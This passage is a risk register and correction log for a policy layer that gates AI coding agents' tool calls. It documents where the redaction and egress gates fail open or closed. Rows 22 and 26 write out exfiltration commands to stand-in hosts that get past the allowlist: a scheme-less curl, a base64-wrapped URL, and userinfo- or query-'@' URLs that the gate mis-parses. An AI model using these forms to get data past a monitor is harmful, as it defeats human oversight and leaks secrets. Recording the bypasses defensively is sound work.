| 2 | ~~OpenCode plugin cannot express modify~~ ⚠️ **the row was backwards** | V5 | ✅ **Retired, and inverted.** F2 resolved by running OpenCode 1.18.15 during V5 planning. **Modify is the straightforward half** at both gates — both hooks hand the plugin a mutable object and return `void`. **Deny is the awkward one**: no decision field exists anywhere in the tool hooks (`output.status = "deny"` is accepted and ignored, and the tool runs), so a request-gate deny is a *throw*, and a result-gate deny must be a *mutation* rather than a throw or the secret survives in the session record. The fallback this row anticipated — "falls back to deny-only" — is the one posture this host is **worst** at, so the mitigation it proposed would have been the wrong way to weaken the slice. Replaced by rows 17 and 18 |
| 3 | ~~`opa` CLI dependency raises setup friction~~ | ~~V1~~ | ✅ **Retired.** The SDK ships OPA 0.70.0 in `agent-control-specification-opa-<platform>`. No external binary, so D7 closes as Rego |
| 4 | Two model-call cells cannot go green on v0.1.0 | V7 | Ship red with a stated reason; drive `steps/modelCall` into v0.2 |
| 5 | Upstream AGT breaks the contract mid-project | all | V8 exists for this, but lands late — consider pulling N45/N46 forward if upstream churn shows up during V1 |
| 6 | ⚠️ A `./`-prefixed `bundle:` path silently disables policy — every decision becomes `allow`, with no error | V1 | `createBridge` throws on `/./`; V1's deny test is the backstop. Worth reporting upstream: a fail-open in a governance tool |
| 7 | ⚠️ `enforced_identity` bisection is unavailable over AGT's Python binding | V7 | Resolved by embedding the **Node** SDK, which serializes `input_identity` and `enforced_identity` distinctly. Had we stayed on Python, R1.4 would be unverifiable and N43 impossible. ⚠️ *The SDK choice made N43 **possible**, which is not the same as reachable, and V7 planning found the difference: `PolicyBridge.evaluate` answers with the verdict alone, so the identities the Node binding serializes stopped at the bridge. Reachability is V7's own Task 1 — `evaluateWithEvidence`, with `evaluate` implemented in terms of it.* |
| 8 | ⚠️ AGT's verdict carries no `rule_id` / `reason_codes` / `reasoning` | V1, V7 | `mapVerdict` synthesizes them from `reason` / `message`, and `mapping.yaml` is where that synthesis is declared — so V7 measures it rather than assuming it |
| 9 | ⚠️ S6 grows unbounded — no rotation and no size cap | V2 | Accepted. It is a gitignored local demo artifact; `: > .acs/envelopes.jsonl` truncates it safely mid-run because `tailEnvelopeLog` resets on truncation. Rotation is not built, and the runbook says so |
| 10 | ⚠️ The sink's two synchronous `appendFileSync` calls per request sit **on the decision path**, and `Bun.serve` is single-threaded | V2 | Accepted, and correct for demo scale. Surfaced by V2's whole-branch review as the neighbour of row 9: a slow filesystem (a stalled network mount, a full disk) blocks *every* in-flight request, not only the one being recorded, because there is no second thread to run them on. No correctness risk — the sink is total, so a write that fails degrades observability and never a decision (constraint 8) — and no latency budget is claimed for it. Recorded rather than fixed; an async or queued sink is the change if a deployment ever needs one |

| 11 | ⚠️ AGT's stock `warn` gate has no ACS v0.1.0 wire source | V3, V7 | Accepted and recorded rather than worked around. The only stock rule emitting `warn` is the drift gate, which reads `input.annotations.drift_score`; annotations reach the policy input from a manifest-declared annotator, never from the snapshot (verified across five placements). The ACS v0.1.0 tool-call-request payload carries no field a score could be derived from, so the Guardian must originate it — which is what AGT's design asks a host to do. V3 makes `warn` live through `policy/manifest.drift.yaml` and says plainly in the runbook that the score is deployment-supplied, not wire-derived. V7's matrix records the cell with that reason |
| 12 | ⚠️ V3's fixture bundles could drift from the pinned bundle and quietly void R2.2/R2.3 | V3 | Covering five verdict classes needs five config documents, and config lives in the bundle directory (the shipped SDK exposes no data-push API). The test helper that builds each fixture bundle asserts every copied `.rego` is byte-identical to `policy/lib`'s, and V3's last task runs `bun run verify:pin` — so a fixture that forked the bundle fails rather than passing quietly |

| 13 | ⚠️ S14's `seq` is derived by reading the log, so two hooks running concurrently can emit the same number | V3, V6 | Accepted and recorded. The sink runs in a fresh subprocess per hook, so `seq` is derived from the entries already in the file at open time — which makes it per-session monotonic where a per-instance counter made every entry `#1`. Nothing synchronises the read, so parallel hooks can duplicate a number; harmless while a host fires hooks one at a time, wrong the day one does not. It also re-reads the whole log on first write, on the decision path, against a file with no rotation. ~~**V6 matters here:** a per-session monotonic sequence is the natural index for its hash-chained session history, and it would need the duplicate closed first~~ ⚠️ **Checked in V6, and the expectation did not hold — V6 took no dependency on this row.** S3's `seq` is assigned inside one synchronous `append` in the Guardian's single process, not derived by re-reading a log, and its chain's ORDER is carried by `prev_hash` rather than by the counter — so nothing in V6 needed this duplicate closed. The row's own hazard is unchanged and still S14's; only its claim on V6 is retracted. See §V6 |
| 14 | ~~⚠️ When the negotiated ServerHello cannot be *persisted*, the posture it declared is still not applied to the current hook~~ | V3 | ✅ **Closed.** Visibility shipped first (the failure lands in the audit entry as `session_failure` rather than being swallowed by a bare `catch {}`), and the deferred half is now closed too: `handshake()` throws `SessionConfigNotStoredError` carrying the ServerHello it could not store, and the shim applies that value to the step that negotiated it (`store.get() ?? negotiated`). Persisting is an optimisation for later hooks — the shipped host runs each hook in a fresh subprocess — while the value in hand is authoritative for this one, so a deployment declaring `deny` no longer fails *open* on the very step whose posture it just negotiated. `session_failure` still travels into the entry, so the persistence failure stays visible; pinned by `hosts/claude-code/test/posture.test.ts`'s "applies a ServerHello it could not persist to the step that negotiated it" |

| 15 | ⚠️ A tool-output replacement that does not match the tool's own output schema is **silently discarded**, and Claude Code delivers the original — secret and all | V4 | The slice's central hazard, and a fail-open of the same family as the nine already closed. Measured, with Claude Code's own text: *"returned updatedToolOutput that does not match Bash's output shape; using original output"*. Handled structurally rather than by care: the adapter patches a **clone of the object the host handed it**, at a path S1 names, so every sibling field survives by construction; where it cannot express the edit in the host's shape it fails **closed** (a withholding deny), never "applied" with nothing applied — including where the edit lands in the ACS payload and leaves the one leaf this gate carries untouched, which is the same defect reached by a rewrite that changed nothing rather than by one the host declines. **One scoped exception, measured and recorded** in §V4's watch-for: the check asks whether that leaf changed, so a `modifications` bundling a leaf edit with a non-leaf one is reported applied while the non-leaf half is dropped. Nothing leaks — the leaf edit landed — so it is a false record rather than an unredacted delivery. Pinned by a test asserting every sibling field, and mutation-tested |
| 16 | ⚠️ A `deny` at the result gate does not suppress output — `block` is a reason, not a withholding | V4, V7 | Measured: the model received the real stdout *and* the block reason. Deny therefore renders as `block` **and** a replacing `updatedToolOutput`; only the latter withholds. Left as prose in an earlier draft of §V4 and now structural, because rendering `block` alone would report a suppression that did not happen — the exact shape §V3 found when V1 copied a raw `modifications` object into `updatedInput`. V7's matrix records the cell: on this host, at this gate, `deny` is expressible only *through* the modify mechanism |

| 17 | ⚠️ On OpenCode, `tool.execute.after`'s `metadata` carries **its own copy of the output**, so a redaction that patches only the leaf leaves the plaintext in the host's session record | V5, V7 | The slice's central hazard, and it **inverts V4's central safety property**: V4 withholds by cloning the host's own object so every sibling survives, which is exactly right where siblings are unrelated fields and exactly wrong where one mirrors the leaf. Measured — the model received `[REDACTED]` (zero copies in the `message` table) while the persisted part kept `metadata.output: "TOKEN=ghp_ONLYINOUTPUT999\n"`, with nothing malformed and nothing warning. Handled structurally: S2 declares `outputs.mirrors` and `replacingOutput` patches every one, under the same three guards the leaf patch has — a mirror naming a field the tool never produced, or one whose type the replacement does not match, is refused rather than written, because a replacement of a shape the host declines delivers the original. **⚠️ The post-condition beside it was redesigned during V5 execution, and the first design broke the *shipped* host.** It asked whether the withheld value survived anywhere in the replacement — which conflates "holds the same value" with "is a copy of the leaf", and nothing in a payload distinguishes them. Claude Code's `tool_response` carries `stdout` and `stderr`, both `""` for any command that prints nothing, so `stderr` read as an undeclared mirror and **every silent command became a blocking stop with no audit entry** — `touch`, `mkdir`, `git add`. Measured end to end through the shim; invisible to the suite because no test fed an empty output at the result gate. What ships instead is two questions: every **declared** mirror received the replacement, and — **only for a hookmap that declares mirrors at all** — no other field still holds the original. A host declaring none has said it has no duplicate-carrying siblings, so the scan never runs for it. **⚠️ That gating narrows the root error; it does not remove it, and saying otherwise would be the third unmeasured claim this branch has had to retract.** The second question is still the same "holds the same value ⇒ is a copy of the leaf" inference — so on a host that *does* declare mirrors, an unrelated sibling coincidentally equal to the leaf is refused, at the preflight, as a blocking stop with no audit entry. That is the exact failure that broke host #1, surviving for host #2 — the subject of this slice. Measured at both ends and pinned as a deliberate over-refusal. Two further limits, stated because they are easy to assume away: the scan walks only the clone of `outputs.within`, so a duplicate the host keeps **outside** that container is invisible however it is declared; and an undeclared mirror on a host that declares **none** is not detectable at all. All three are the hookmap author's to get right, and V7's matrix carries the cells |
| 18 | ⚠️ On OpenCode, a result-gate `deny` expressed as a **throw** withholds from the model but cannot scrub that copy | V5, V7 | Measured both ways: the plugin's own view of `metadata.output` was `[WITHHELD]` at the moment of the throw, and the record kept the plaintext — OpenCode discards the plugin's mutations on the throw path and rebuilds `metadata` from its own pre-hook copy (the rebuilt object had also lost `exit` and `truncated`, which is what proves it is a different object). So deny at this gate **withholds by replacing**, never by throwing. The same conclusion §V4 reached on Claude Code — a result-gate deny goes *through* the modify mechanism — arrived at from the opposite host mechanism, which is worth stating because the two hosts fail in mirror-image ways: Claude Code's `block` reports a withholding while delivering the output, OpenCode's throw withholds the output while keeping it on disk |

| 19 | ⚠️ Widening the tool matcher turns `mapping.yaml`'s `into_argument: command` from harmless into a redaction delivered against the wrong argument | V9 | The defect V9 creates and V9 closes. Measured through the **pre-slice** `mapVerdict` and `mapping.yaml`, taken verbatim out of `be5ab38` and handed the real AGT verdict the shipped bundle produces: an AGT `transform` on a `WebFetch` call is emitted as `parameter_overrides.command`, a key the tool has no argument for, while `url` — carrying whatever AGT redacted — is delivered untouched. Not a pre-existing residual: under `^Bash$` there is exactly one tool and exactly one argument name, so the literal has never been able to misfire. Handled structurally by N54 rather than by care — the argument the policy target is read *from* and the argument an override is written *to* are one `mapping.yaml` entry read twice, so they cannot disagree. Same family as rows 15 and 17, reached from a third direction |
| 20 | ⚠️ An annotator declared in a manifest the Guardian dispatches nothing for is a **total deny**, not a no-op | V9 | Measured: a manifest carrying `annotators: egress: {type: classifier}`, evaluated by a bridge built without a dispatcher, answers `deny runtime_error:annotation_failed` for `echo hi` as readily as for a `curl`. This is the hazard `policy/manifest.drift.yaml` avoided by being a sibling file. V9 takes the other road — one manifest, `startGuardian` supplying the dispatcher unconditionally — because C9's whole point is every gate live in one Guardian. The seam already exists (`CreateBridgeOptions.annotator`); what changes is that it stops being optional. Backstopped by a test asserting a benign call is not denied under the shipped manifest, which is the one test in the slice whose absence would be silent |
| 21 | ⚠️ `cfg.egress` without an explicit `allowlist` denies every destination | V9 | `allowlist(rules)` falls back to `input.tool.security_labels`, which is `["shell"]` on every tool `policy/manifest.yaml` registers. An operator turning the gate on with a bare `egress: {}` gets a total-deny that reads like a policy decision. `policy/manifest.yaml`'s own `bash` comment anticipated the coupling but not this direction of it. Accepted and pinned by a test rather than engineered around: the fallback is AGT's, and `policy/lib` is byte-identical upstream |
| 22 | ⚠️ An egress destination the extractor cannot parse falls through to `allow`, not to `deny` | V9 | Structural, and stated rather than fixed. `egress.rego`'s gate is `undefined` when no destination resolves, so an obfuscated or novel egress form is unexamined rather than blocked. C7.2 is a detector, and a detector's misses are allows. The runbook says so in the slice's own voice, because the demo's shape invites the opposite reading, and it *shows* it — a scheme-less `curl exfil.attacker.test/steal` and a base64-wrapped form of the URL the same allowlist denies plainly are both captured being allowed. ⚠️ *This row previously ended "and V7's matrix carries the cell as `guardian_only` for exactly this reason." It does not, and cannot: the matrix has no coordinate for a gate class or a route, and `pre_tool_call × deny` already resolves `expressed`. See §V9's amendment under C7.2. The claim lives in this row, in §V9 and in the runbook — which is where it was always true* |
| 23 | ⚠️ V10's approved digest is manifest-static, so the register→load binding ACS specifies is not the binding AGT checks | V10, V7 | Not closable from this side: `content_hash.rego` reads the declared hash from `input.tool` alone, which the SDK resolves from the manifest's `tools:` catalog — no config hook, no annotations. A digest approved at `steps/skillLoad`'s own `steps/skillRegister` cannot reach the gate through session state. V10 declares the digest in the manifest and says so; the `(skill_id, digest)` binding is a Guardian-side ACS control V10 does not build. Closing it upstream would mean AGT accepting a declared hash from the snapshot, which weakens AGT's trust model — an upstream conversation, not a slice |
| 24 | ⚠️ The result gate carries the same one-shape-per-gate assumption N54 closes at the request gate, one layer out, and **nothing answers it** | V9 (bounded), unassigned (general) | Found by V9 breadboarding. A hookmap declares `outputs.from` and `outputs.within` once per hook, exactly as the manifest declared `policy_target` once per intervention point. Measured on the shipped hookmap: `$.tool_response.stdout` against a `WebFetch` result resolves to `undefined`, `buildPayload` throws, `governStep` answers with the posture, and under the shipped `proceed` **the step runs ungoverned with an audit event**. V9 bounds it by widening the `PreToolUse` matcher only — no stock gate reads a fetch's output, so the result gate buys nothing and costs a fail-open. The general close is the `outputs` counterpart of S10's `by_tool` table, and it is **not** V9's: it needs its own measurements per host, and the two hookmaps' `outputs` blocks already differ (`mirrors` on one, a real `exit_status` path on the other). Recorded with the boundary stated rather than left to be inherited |
| 25 | ⚠️ Two of `egress.rego`'s five destination paths resolving to **different** strings is `runtime_error:policy_invocation_failed`, not a priority order | V9 | Measured, against the shipped manifest and bundle: a snapshot carrying `args.url: "https://docs.anthropic.com/a"` **and** an annotation destination of `https://exfil.test/b` answers `deny runtime_error:policy_invocation_failed` — another total deny wearing a runtime-error reason. `destination(rules)` is a COMPLETE Rego rule over `some path in paths`, so two paths with two values have no single answer; two paths with the *same* value are fine (measured: `allow`, `result_labels: ["public"]`), which is what makes this specifically a conflict rather than a duplication. Not reachable across the two tools this slice governs — `WebFetch` sends `url` and an empty `raw_command`, `Bash` sends `command` and a populated one — and reachable on the first tool registered that sends both. ⚠️ *This row said "Closed **structurally** in N55", flat. It over-claimed, and the narrowing is the whole correction: **one of the two conflicts is closed and the other is not**.* What N55 closes is the **annotation-versus-argument** conflict — `annotateEgressDestination` answers `{}` whenever the snapshot's own arguments already carry a destination AGT reads (`url`, `endpoint`, `host`, `domain`), with its own test, so this deployment can never be the second voice. What nothing here closes is the **argument-versus-argument** conflict: a tool sending two of those four with different strings is the identical complete-rule failure, and both paths are the gate's own defaults with both values supplied by the tool, so there is no seam on this side to answer it at. Fail-closed in both directions — a total deny wearing a runtime-error reason, never a bypass — which is why this is a precision correction rather than a behaviour one. The stand-down list is also a copy of `default_destination_paths`, correct only while the gate runs on its defaults: `cfg.egress.destination_paths` replaces that list outright, and a deployment setting it has to revisit `ARGUMENTS_AGT_ALREADY_READS`, which now says so in its own doc comment. The tool's own argument is the better evidence anyway — it is what the tool will actually reach for, where a command line is what someone typed |
| 26 | ⚠️ A URL whose **userinfo carries a colon** reads to `egress.rego` as the userinfo's own host, so an off-allowlist destination is **allowed** — and only one of the two routes can be closed from this side | V9 | AGT's parser, not this side's: `policy/lib/egress.rego`'s `host_of()` takes the substring after the scheme, cuts it at the first `/`, cuts *that* at the first `:`, and calls the remainder the host. Measured through the OPA binary the pinned SDK ships: `host_of("https://docs.anthropic.com:pw@exfil.attacker.test/steal")` is `docs.anthropic.com`, which `*.anthropic.com` covers. **This is a different and worse class than row 22.** Row 22 is a URL the extractor never finds; this is a URL that reaches the gate correctly and the *gate* mis-parses, so a reader who has absorbed "misses are allows" still wrongly believes a URL that reaches the gate was decided about. Measured against the shipped allowlist through a Guardian started from this tree with the fix below removed: that URL was **allowed on both routes**, while the same host bare was denied on both. **The shell route is now closed here; the fetch route is not.** The Guardian chooses the string it hands the gate for a `raw_command`, so `annotateEgressDestination` strips the userinfo before answering and the gate resolves the host the request actually reaches — measured, `deny egress_destination_not_allowed`, *destination exfil.attacker.test not in allowlist*. A fetch's own `url` is the gate's **first** declared destination path and reaches `host_of()` with nothing in between; correcting that would mean editing a `.rego`, which is AGT's file, held byte-identical by `bun run verify:pin`, and is this branch's central claim. So it is recorded and captured rather than fixed — `docs/demos/v9-runbook.md` §5 has both routes' verdicts from a real run. ⚠️ *The first version of the strip bounded the authority at the first `/` alone and **re-opened this bypass on a different shape**: RFC 3986 ends an authority at the first of `/`, `?` or `#`, so on a path-less URL an `@` inside a query or fragment was read as a userinfo delimiter and everything before it discarded. Measured, `curl https://evil.test?x=a@docs.anthropic.com` and its `#` form were **allowed** on the shell route while the unfixed fetch route denied both — the fix briefly made the route it repaired the weaker of the two, and it needed no userinfo semantics from an attacker at all. Caught by the scoped re-review, not by this side. What ships bounds at `/`, `?` and `#`, with a test for each of the query form, the fragment form and a userinfo genuinely ahead of a query. Recorded rather than quietly corrected, because a normalisation that re-opens the class it was written to close is the failure mode worth publishing.* **The upstream ask is therefore both halves, not one:** `host_of()` should bound the authority at the first of `/`, `?` or `#` **and** cut it at the last `@` before splitting on `:`. Measured, it does neither — `host_of("https://evil.test?x=a@docs.anthropic.com")` answers the whole string, which denies here only because no allowlist pattern matches a string containing a `?`. Worth reporting upstream, alongside row 6 |
| 27 | ⚠️ With the shipped allowlist, **every shell command whose text merely contains an off-allowlist URL is denied**, whether or not the command reaches anything | V9 | Accepted, stated, and captured rather than re-tuned. Measured against the shipped configuration: `git clone https://github.com/openai/whisper`, `pip install -i https://pypi.org/simple requests` and `echo 'docs at https://example.org/readme'` all answer `deny egress_destination_not_allowed`, while `npm install` and `ls -la` answer `allow`. The allowlist ships one reachable entry, so this deployment is in effect *deny any shell command mentioning a URL* — a URL in an `echo`, in a shell comment, or in a flag value the command never dereferences is denied like a `curl` to it. `annotate-egress.ts` already reasons about false positives from a bare-host pattern and did not address this residual class. **Neither re-tuning is available.** Widening the allowlist would edit a demo-load-bearing file the runbook captures; narrowing the extractor to distinguish *reaches* from *mentions* means parsing shell, which this slice did not shape and which fails in the permissive direction when it is wrong — worse than over-blocking, in a gate whose miss direction is already allow. So the direction is published instead: the runbook's §5 carries the captured rows beside row 22's miss direction, and the README's install step now says that copying the widened `settings.json` turns egress enforcement on for shell commands too. The operational consequence is live rather than hypothetical — this repository's own `.claude/settings.json` already carries the widened matcher |

## Open decisions carried from shaping

| # | Decision | Blocks |
|---|----------|--------|
| ~~D1~~ | ✅ **Closed: confirmed, OpenCode is host #2.** Resolved during V5 planning by running OpenCode **1.18.15**, not by reading it. Its plugin API expresses both gates: modify by mutating the object each hook is handed, deny by throwing at the request gate and by replacing at the result gate. ⚠️ *This row said "against an unchanged adapter", which is what planning believed and what execution disproved — the adapter gained two hookmap fields, four load-time gates, a normalising `loadHookmap`, and the `tools` rule both shims share. (It also named a count of changed files; that count went stale in the review round that followed and is gone rather than re-measured.) The claim that survives is stronger and is R3.4's actual subject: **no per-host fork.** Every line landed in `packages/host-adapter/src`, the package both hosts run, and host #1's own source is +0/−0.* Two conditions attach, both new watch-fors in §V5 and risk rows 17/18 — `metadata` mirrors the output leaf, and a throw cannot scrub that mirror. R3.6 moves from 🟡 *leaning yes* to confirmed | ~~V5~~ |
| ~~D3~~ | ✅ **Closed: three `steps/*` hooks of nineteen, and the third earns its place by driving an AGT rule.** `steps/toolCallRequest` and `steps/toolCallResult` through V8; `steps/skillLoad` added by V10 because `hooks/skill-load.json`'s own text is `content_hash.rego`'s decision clause for clause, and no AGT host package has a hook for it. Coverage beyond AGT's eight points was always going to be a spec exercise unless a hook did real policy work — this one does. ⚠️ *V9/V10 planning briefly restated the denominator as 22 and called V1's 19 stale. It is not: 22 is every hook payload schema, 19 is the `steps/*` subset, and R5.4 asks about `steps/*`. V1's figure stands and §V10 now carries both counts with the three non-`steps` schemas named* | ~~V7~~, V10 |
| D4 | Spec `steps/modelCall` for v0.2 as part of this work | V7 red cells |
| D5 | Determinism of the demo | V1 onward |
| ~~D7~~ | ✅ **Closed: Rego.** Cedar's sole advantage was avoiding an external binary; the SDK bundles OPA, so that advantage does not exist. Stock bundle verified 105/105 under the bundled OPA | ~~V1~~ |
| ~~D8~~ | ✅ **Closed: `proceed`, the spec default.** R1.7 and `handshake.json`'s own `default` both fix it, and V1 already shipped it in `handshakeResponder()`. V3 makes it deployment-declared (`ACS_ON_DECISION_FAILURE`) so one binary demos both halves, with `proceed` when unset — and a value that is neither posture **throws** rather than falling back, because guessing a posture from a typo is the silent bypass this slice exists to remove. Paired with U23's audit count, per the original reasoning | ~~V3~~ |
| ~~D10~~ | ✅ **Closed: V7 owns it, as a measured non-claim.** The ACS Trace pillar (`trace/otel-mapping.json`, `trace/ocsf-mapping.json`) is normative and was unclaimed by any slice. It now lands in V7 as `N49`/`N52`/`U33` — V7 *measures* the pillar rather than emitting it, and the matrix declares it as a pillar this implementation does not claim, with the reason attached. Five required attributes, across three rows, already measure red on D10's own evidence table (a broader N49 measurement later found six across the full Trace pillar, adding `acs.reasoning` — see §V7), and N49's measurement corrected why: `acs.evaluator` maps to `AcsResult.metadata.evaluator`, `acs.confidence`/`acs.evaluator_version`/`acs.model_id` map to that same optional `metadata` object, and `acs.capability` maps to an optional payload field — all **optional**, not absent, as this row previously claimed. All five are the same failure: declared, never guaranteed. The consequence is the publishable part — **a downstream consumer of the ACS wire cannot emit a conformant trace**, only the Guardian can, from knowledge the contract does not carry. Building an exporter would be a slice of its own, not V7 scope. Evidence tables in §V7 and in the shaping doc under D10 | `specification/v0.1.0/trace/otel-mapping.json` and `trace/ocsf-mapping.json` are *normative* — the OTel mapping states that a deployment emitting OTel for the Trace pillar MUST use its span names and required attributes verbatim, and it names `steps/toolCallRequest` → `gen_ai.tool.call` explicitly. V2's S6 is deliberately a raw envelope log, **not** an OTel or OCSF export, so this implementation currently claims neither. R5.3 says we declare what we claim and what we do not. Surfaced during V2 planning, measured after V2 shipped, and settled into V7 | V7 (N49, N52, U33) |

**Correction log.** V1 planning verified the AGT surface by running it rather than reading it, and produced ten corrections — the SDK choice, the `./` landmine, config-inside-the-bundle, the absent stock shell patterns, the leaf `policy_target`, AGT's missing `rule_id`/`reason_codes`/`reasoning`, lowercase wire decisions, `steps/toolCallRequest` and the 19-hook count, the retired `opa` setup cost, and the Python identity collapse. Each is recorded above at the row it governs, with its evidence, in `docs/superpowers/plans/2026-08-09-v1-one-host-one-hook.md`.

V2 planning produced no corrections — §V2 had nothing wrong in it — but it did close five open choices (P1–P5, recorded under §V2), add three watch-fors, add risk row 9, and surface D10. Its plan is `docs/superpowers/plans/2026-08-09-v2-envelope-inspector.md`.

**V3 planning produced five corrections**, each recorded at the row it governs in §V3, and each verified by running AGT rather than reading it. Its plan is `docs/superpowers/plans/2026-08-10-v3-dispositions-and-postures.md`. In order of consequence: ACS `defer` has no AGT verdict behind it, so the demo promised something AGT cannot produce (and ACS being wider is the point, not a gap to fill); `annotations` never reaches the policy input from the snapshot, which is what makes `warn` reachable only from a Guardian-originated score; the stock approval gate is a single global switch, so several verdict classes need several config documents; "the rest is data, not structure" missed two load-bearing structural pieces on the `modify` path; and `guardianClient.post` had no timeout, without which N6 could never fire. Two of the five are notes about **ACS v0.1.0's** coverage rather than AGT's, and go to V7's matrix as resolved cells with reasons. D8 closed on the spec default in the same pass.

**V4 planning produced six corrections and closed F1**, each recorded at the row it governs in §V4, and each verified by running the thing rather than reading its documentation — Claude Code 2.1.227 and AGT at the pinned ref. In order of consequence: a tool-output replacement that does not match the tool's own output schema is **silently discarded and the original delivered**, which makes the naive redaction a fail-open; a `deny` at the result gate does not suppress anything, so `block` alone would report a withholding that never happened; `renderDecision` cannot express this gate at all, which forces S1's `decisions` block to become per-hook and — not incidentally — makes V5's "same module as N3" true rather than aspirational; ACS's result payload carries no tool arguments, so `tool_call.name` is synthesized and correlation is V6's; `modifications.modified_content` has no target on this host at *either* gate, upgrading §V3's note to a stronger V7 statement; and a second config document is impossible without forking the pinned bundle, so `redact` ships in `policy/lib/data.json` — which in turn makes §V3's runbook sentence about reverting that edit stale. Three of the six are notes about **ACS v0.1.0's** coverage or about this host, never about AGT: its README's "cannot *reliably* redact" is exactly right, and V4's evidence is what shows why. Its plan is `docs/superpowers/plans/2026-08-11-v4-output-redaction.md`.

**V5 planning produced six corrections, closed F2 and closed D1**, each recorded at the row it governs in §V5, and each verified by running OpenCode **1.18.15** rather than reading its documentation — driven by a local deterministic model endpoint, so the tool path is genuine and the measurement costs nothing. In order of consequence: `tool.execute.after`'s `metadata` carries **its own copy of the output**, which inverts V4's clone-every-sibling discipline from the property that makes a redaction safe into the one that leaks it; a result-gate `deny` expressed as a **throw** withholds from the model but cannot scrub that copy, because OpenCode discards the plugin's mutations on the throw path — so deny there withholds by replacing, which is §V4's conclusion reached from the opposite mechanism; risk row 2 was **backwards**, since modify is the straightforward half on this host and deny is the half with no field at all; `N10` named two hooks that do not exist (`session.start`, `tool.execute.error`); `exit_status` is a real field here rather than V4's hookmap literal, which makes that gap Claude Code's rather than ACS's; and `modifications.modified_content` has an obvious target at OpenCode's result gate, because its output is an opaque string — the exact case §V4 predicted would have one, so V7's matrix carries the cell as red for one host and green for the other rather than red outright. Three of the six are notes about **this host** or about **V7's matrix**, never about AGT. Its plan is `docs/superpowers/plans/2026-08-12-v5-second-host.md`.

**V5 execution produced a seventh correction, and it falsifies a claim V4, V5's plan and this document all repeated** — that the parked landing check was "one check" closing both holes. Building it showed a per-target comparison passes all three of V4's recorded bundles, because each one's declared targets genuinely change; the plan's own test had used a no-op fixture and so never met the case V4 measured. The holes are two questions — **value** at the request gate, **observability** at the result gate — and they are closed by two checks in the two files that respectively can and cannot know which target is the projected leaf. Recorded at §V4's parked item and §V5's inherited-scope note. Worth stating as its own entry because the claim survived three documents and a planning round unchallenged: it was repeated, never re-measured, and only building it caught it.

**V9/V10 planning produced five corrections, closed D3 and R5.4, and answered R8.3 by building it** — every one measured against the pinned bundle through the shipped assembler and the shipped `mapVerdict`, never read out of AGT's documentation. Its spike is `docs/shaping/spike-unreached-gates.md`. In order of consequence: the manifest's single `policy_target` **denies a benign call on `runtime_error:path_missing`** for any tool without a `command` argument, so governing a second tool shape is code before it is policy, and AGT's `intervention_point` being `additionalProperties: false` is what forecloses the easy answer; `mapping.yaml`'s `into_argument: command` is a **literal**, so the moment the matcher widens a redaction is emitted against an argument the tool does not have while the original ships — the third arrival of rows 15 and 17's family; a manifest declaring an annotator the Guardian dispatches nothing for is a **total deny**, benign calls included, which is the unstated reason `manifest.drift.yaml` is a sibling file; AGT's `$defs/tool` is `additionalProperties: true` and the SDK carries an extra key through to `input.tool`, which is the whole reason `content_hash` is reachable at all; and `cfg.egress` without an explicit `allowlist` falls back to `input.tool.security_labels` and denies everything.

**Two of the five invert claims this project had already made in conversation**, which is why they are listed rather than folded into the slice sections. Egress had been described as a mapping problem needing an extraction step: measured, `egress.rego`'s **first** default destination path is `snapshot.tool_call.args.url` and `assemblePreToolCallSnapshot` already lands there, so for a `url`-bearing tool it is one `data.json` key with no code and no Rego — the strongest form of R2.1 in the project, and it had been filed as work. And `content_hash` had been described as a field ACS carries at a different address: measured, ACS puts the integrity digest on a **skill** and AGT's gate is about a **tool**, with the AgBOM making the split explicit (`skill_fields.definition` required and named "the surface attackers poison"; `tool_fields` requiring only `capability`). Same control, different component class — a weaker claim than "different address", and the one V10 has to publish.

**V9 execution produced five corrections of its own, and two of them retract sentences this document had already published.** Each is recorded at the row or subsection it governs in §V9, and each was measured against the shipped build rather than reasoned about. In order of consequence: an annotator's `from` is a **liveness precondition, not a projection** — an unresolvable one denies the whole call with the annotator never dispatched, `from` is a required field so omitting it is not available, and the dispatcher receives AGT's whole preliminary policy input rather than the resolved value, which is why `raw_command` is on every request snapshot and not only on the ones that have one; the `guardian_only` / `expressed` **matrix-cell** claim is not implementable, because V7's matrix is 8 points × 5 verdicts read off the SDK's own consts with no coordinate for a gate class or a route and `pre_tool_call × deny` already resolving `expressed` — the distinction is real, the cell is not, and it is stated in §V9 and the runbook instead; two of `egress.rego`'s five destination paths resolving to different strings is `runtime_error:policy_invocation_failed` rather than a priority order, which is risk row 25 and is closed structurally in N55; the demo matrix is eight rows measured on the manifest this slice ships rather than the two partial tables planning carried; and OpenCode's fetch tool has its **name** measured in §V5 and its **argument key** measured live during execution, which are two different kinds of evidence and are now labelled as such.

**A sixth correction belongs to `packages/conformance` and inverts a scope statement made during planning.** V9 was recorded as touching that package *not at all*. It adds no cell to the coverage matrix and changes neither of its axes — that part stands and is the real point. But declaring an annotator on the shipped manifest meant every construction of a bridge against that manifest had to supply a dispatcher or deny every call with `runtime_error:annotation_failed`, and two of those constructions are production files in `packages/conformance/src/`. They are now routed, with the Guardian and every test, through one `createDeploymentBridge` behind a declared `guardian/deployment` subpath export — so the harness and the deployment provably build the same bridge, which is a stronger property than the untouched-package claim it replaces.

**V9 execution also corrected one measured mechanism it had inherited.** §C7.2 said `host_of()` "splits on `://` and `/`, so handed `curl https://evil.test/x` it answers `curl https`". Run through the OPA binary the pinned SDK ships, it answers `evil.test` — the embedded, path-bounded URL is the case that *works*. The real reasons extraction is needed are in §C7.2's amended text. ⚠️ *A first draft of this paragraph ended "so no copy of the wrong mechanism survives in the tree", which was itself untrue — `docs/shaping/spike-unreached-gates.md` §A3 still carried it, in the very document this slice sends readers to for its measurements. It now carries a ⚠️ retraction with the OPA output beside it. What can be claimed, because it was swept rather than assumed: `git ls-files | xargs grep -l host_of` names eight tracked files. Two are the vendored upstream bundle (`policy/lib/egress.rego` and its upstream test), which this repository does not author and `verify:pin` holds byte-identical. The other six — `packages/guardian/src/annotate-egress.ts`, `policy/manifest.yaml`, `hosts/claude-code/claude-code.hookmap.yaml`, `docs/demos/v9-runbook.md`, this file, and §A3 as amended — were each read, and each states the two-branch behaviour. The old sentence still occurs three times in the shipped doc set — twice in this file and once in §A3 — and every one of those is a quotation inside a retraction, never a statement.*

**V2's whole-branch review produced one correction of its own**, recorded at the watch-for it governs: "S6 records the wire verbatim" over-claimed byte identity that the implementation never had, and the over-claim had propagated verbatim from the plan's global constraint 11 into the slice README, the runbook, the shaping doc's S6 row, and the Inspector's renderer. Corrected in wording, not in code — see the watch-for above for why storing raw bytes would be the worse trade. The same review added risk row 10.
